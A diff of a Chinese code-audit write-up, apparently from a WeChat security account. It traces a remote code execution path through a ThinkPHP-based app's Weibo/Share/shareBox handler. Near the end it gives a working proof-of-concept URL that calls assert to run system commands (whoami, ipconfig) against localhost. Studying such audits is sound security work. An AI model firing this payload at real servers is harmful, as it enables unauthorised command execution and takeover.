@@ -64,7 +64,7 @@ PhpStudy（2016 版本）、Phpstorm（2020.3.2 版本）
 
 **审计步骤：**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfCWq6n0VO0u5gNnw3t8pBycCg08P81hseP8Ba3Csbv4VlrI5ULrEvsg/640?wx_fmt=png)
+![](../../.resource/remote/1704db8cc5c67c0543278d1d041500c16d8853c55cc23f2bad758792455fc8e8.png)
 
 由于是 thinkphp 框架写的，是（应用 / 控制器 / 方法名）进行访问的，
 
@@ -72,7 +72,7 @@ PhpStudy（2016 版本）、Phpstorm（2020.3.2 版本）
 
 往下走就是到 17 行②处，这里将 query 解码的值传到③sharabox.html 页面
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfVTSEQiasxsnGvcNfT7B73no4fIaMuSbRvFeN5IDrY6a4ia8OXx1c7ZbA/640?wx_fmt=png)
+![](../../.resource/remote/018da962ee9fb69f95b2e2e6a8ea9579db745a3e64ec6c18abf70656960139b8.png)
 
 ```
 然后query的值就赋到'param'的参数上面调用Weibo/Share/fetchShare方法。
@@ -89,9 +89,9 @@ PhpStudy（2016 版本）、Phpstorm（2020.3.2 版本）
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfYTIBBCnKTL4xx6LEbwrWPFboAj36rauUkK1LkbUSZgC3P1eAibupJFQ/640?wx_fmt=png)
+![](../../.resource/remote/aac8cf414b897a8d72f577ab8b590e131660e606dfca5e72c156661e9787404b.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfqJHqtNvJjZFCYWUiaddvYapAsMroN2Utib8FMb5rYcZQ1a2H0efUAdeQ/640?wx_fmt=png)
+![](../../.resource/remote/317ee2fd7a770a43510aa862fd747a0582b211c76c6bace897c5a83be5db7d19.png)
 
 ```
 R(方法是远程调用控制器的操作方法 URL 参数格式 [资源://][模块/]控制器/操作
@@ -105,14 +105,14 @@ R(方法是远程调用控制器的操作方法 URL 参数格式 [资源://][模
 
 然后我们继续往回看，也就是 sharebox.html 远程调用 Weibo/Share/fetchShare 方法这里。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IftuYRVRhh2Xj2kC1b7RWr7JQWYhMFpDtJ4icQSghFVePXs6uU8icAHICw/640?wx_fmt=png)
+![](../../.resource/remote/f933dd71775d2e12761dc4c2ec44db996a85b8905930366edfd9f5544738ef78.png)
 
 ```
 query的值就赋到'param'的参数上面调用Weibo/Share/fetchShare方法。
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfeClNjScx0fffGFcDDXlvTiaxkDaHOdkLNpedXsYa1da1LdkqB6MTG4w/640?wx_fmt=png)
+![](../../.resource/remote/d3c116bef6031fb908296571a339bdde1e943ea9a12031889e723cb39353c32d.png)
 
 ```
 而且D方法只会寻找模块（model）类
@@ -139,7 +139,7 @@ query的值就赋到'param'的参数上面调用Weibo/Share/fetchShare方法。
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfuJGEy3ogzGjKZRKiaN8lCktbIJCk9WvQhP8zsFIT9XkjKfY3KR4ba2g/640?wx_fmt=png)
+![](../../.resource/remote/089740bec4a1f8cd80876b0af75b17bede3983a8ea2c94a24dc56a9d6821ce3a.png)
 
 ```
 而fetchShare方法里又将值传给assginFetch方法又又传给了getinfo方法。继续往下跟进
@@ -148,7 +148,7 @@ query的值就赋到'param'的参数上面调用Weibo/Share/fetchShare方法。
 
 上面是调用了 D 方法也就是模块类 Weibo/Model/ShareModel
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfIRo3QqMren4hNFx0sOKCW6mVHxGEicwUg4eudwfx26GAKIPUibLDGK2g/640?wx_fmt=png)
+![](../../.resource/remote/33973796e79f1f7107b46f93fe68e023def388d9e81ba31ead2bd8cc49e0f537.png)
 
 ```
 这里的getinfo方法会将传过来的参数进行判断，如果app、Model、method
@@ -162,12 +162,12 @@ query的值就赋到'param'的参数上面调用Weibo/Share/fetchShare方法。
 
 poc：query=app=Common%26Model=Schedule%26method=runSchedule%26id
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfiaSkY8qKL6fDHG6Ja1unJ6O2Ummzyy6Ekb9Kia8dMwkVePyUD2uNHIicA/640?wx_fmt=png)
+![](../../.resource/remote/57927f9ca7ee11e6f868680f021723f171eac440b7372a34a875990e61bf9667.png)
 
 这里的调用 D 方法又成了执行 Common/Model/ScheduleModel/runSchedule 方法
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7If83HrVb8woia6Gp8hVjpbfk42Jtl7e9mTLunrQeYa6Vk9f03RqvTdk6w/640?wx_fmt=png)  
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfyKmczapDBk8RBxxkPo1nb9DCExDIQ1JLN1aWUzBy9iaCkBibUHaWQlLQ/640?wx_fmt=png)
+![](../../.resource/remote/1e9d33524623fb19a207362c7199558846548924a1aaaf1c51257f162a0fa418.png)  
+![](../../.resource/remote/f93ac587edd6ae1686058850c104611b3db54e0a223d408abe48fd4f94c37c8a.png)
 
 ```
 这里是利用了moonv师傅找出的runSchedule方法然后继续调用D方法进行实例化模块。
@@ -189,9 +189,9 @@ poc：query=app=Common%26Model=Schedule%26method=runSchedule%26id
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7If82YCKCa2b1eDYScQ3zLwzgc825IibvqRqKGWoKL5ZuqvOFOzWSnsgWw/640?wx_fmt=png)
+![](../../.resource/remote/f9f68dd0dfa3a933132b37356b891c787a35c3aa677f1521257b9090bcbe0e7f.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfE04Ehd5orJich5FJbibz6iaveCP2iayqBbKHEWlwCkJ2olHBribXWDiboTzw/640?wx_fmt=png)
+![](../../.resource/remote/c6d1d9569331582ee1c60c7eb649fc1d9a319761774e08f4af9a3ce2c05c8d60.png)
 
 ```
 继续往下的话就到了_validationFieldItem方法，这里我也不是很清楚怎么进来的，应该的通过Schedulemodel方法进行执行_validationFieldItem吧。
@@ -203,7 +203,7 @@ poc：query=app=Common%26Model=Schedule%26method=runSchedule%26id
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfrmeZiaGVB9aZ6hSM3F6JsibLrkbE1V0nH1zx0ibia7YbxRziaqgic6x3zBeA/640?wx_fmt=png)
+![](../../.resource/remote/bd49a217ccfeebbe5417f81f31ebe288f81d27824e228b74cfa5a6e5f07901df.png)
 
 1、要 val 下标 4 的值是 function
 
@@ -237,7 +237,7 @@ on%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(whoami)
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfzVr0OJmek5ebYQbBMpy4ib51ibK5SUdXCnia9yCeU57Zb8ol4sNpcp2qw/640?wx_fmt=png)
+![](../../.resource/remote/ebd0846a5d80980f5545a1879e4a2c9fb6705f93c872943cf735c1fd4d93ae98.png)
 
 **影响版本：**
 
@@ -247,22 +247,22 @@ on%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(whoami)
 
 http://127.0.0.1/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ipconfig)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbVXMrFI4QQXichM2jBWX7IfKic8P1t1exFdZ55xUg0H3ibIfdhVVRia7WbOzjXB88f1owpwltk8Xu9lg/640?wx_fmt=png)
+![](../../.resource/remote/cdf7191bff85c81785c5e38386265944b450665eeb262714eab28fc8beeb1986.png)
 
 **如果对你有帮助的话  
 那就长按二维码，关注我们吧！**  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Qx4WrVJtMVKBxb9neP6JKNK0OicjoME4RvV4HnTL7ky0RhCNB0jrJ66pBDHlSpSBIeBOqCrOTaWZ2GNWv466WNg/640?wx_fmt=png)
+![](../../.resource/remote/c054b4eafe6ae7a450ae6350e8669e79fa9f85a67722cd074fa3962c800a2ab9.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/EWF7rQrfibGYIzeAryXG89shFicuMUhR5eYdoSEffib7WmrGvGmSPpdvYfpGIA7YGKFMoF1IrXutHXuD8tBBbAYJg/640?wx_fmt=jpeg)
+![](../../.resource/remote/5ddf78d6ebe65766a69e829e9eb3baddd946677f3cfc0008edbc430328dcfc1a.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/wKOZZiacmHTc9LIKRXddrzz6MosLdiaH4EQNQgzsrSXHObdAia8yeIlLz6MbK9FxNDr44G7FNb2DBufqkjpwiczAibA/640?wx_fmt=png)
+![](../../.resource/remote/5c19b8b53f1a113b7b596c610a3ae6943b3ed60c4a2987f6f00fe00090e2fe1e.png)
 
-**![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)**  [经验分享 | 渗透笔记之 Bypass WAF](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486210&idx=1&sn=5c0f6409e51c3c0cfb6bde43f2406409&chksm=c07fb0f6f70839e0e29f4ea9c8655d4ce7690c2a147aeeb74f2827aece58e3746f3f7c4ee562&scene=21#wechat_redirect)
+**![](../../.resource/remote/fa8192fb4a90b787868684f95ad885090b3f353081f4bcc152e66c612c6a4c74.gif)**  [经验分享 | 渗透笔记之 Bypass WAF](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486210&idx=1&sn=5c0f6409e51c3c0cfb6bde43f2406409&chksm=c07fb0f6f70839e0e29f4ea9c8655d4ce7690c2a147aeeb74f2827aece58e3746f3f7c4ee562&scene=21#wechat_redirect)
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)  [什么是 HTTP 和 HTTPS](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486492&idx=3&sn=0a975b99a0351a95eef41d37813f7e5d&chksm=c07fb7e8f7083efe8054f864b5b25541fa3bf19ab311700f29254d03e45a4357069ee07c8802&scene=21#wechat_redirect)  
+![](../../.resource/remote/fa8192fb4a90b787868684f95ad885090b3f353081f4bcc152e66c612c6a4c74.gif)  [什么是 HTTP 和 HTTPS](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486492&idx=3&sn=0a975b99a0351a95eef41d37813f7e5d&chksm=c07fb7e8f7083efe8054f864b5b25541fa3bf19ab311700f29254d03e45a4357069ee07c8802&scene=21#wechat_redirect)  
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)  [实战 |  BYPASS 安全狗 - 我也很 “异或”](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486492&idx=1&sn=fbd4ca8ed69ba6cb3adbc6ac8561d825&chksm=c07fb7e8f7083efef437eb3d685cc5bd6ac489629c613b5f2ce9ced8a7f8fcd335b6f91821a8&scene=21#wechat_redirect)
+![](../../.resource/remote/fa8192fb4a90b787868684f95ad885090b3f353081f4bcc152e66c612c6a4c74.gif)  [实战 |  BYPASS 安全狗 - 我也很 “异或”](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486492&idx=1&sn=fbd4ca8ed69ba6cb3adbc6ac8561d825&chksm=c07fb7e8f7083efef437eb3d685cc5bd6ac489629c613b5f2ce9ced8a7f8fcd335b6f91821a8&scene=21#wechat_redirect)
 
 右下角求赞求好看，喵~
 
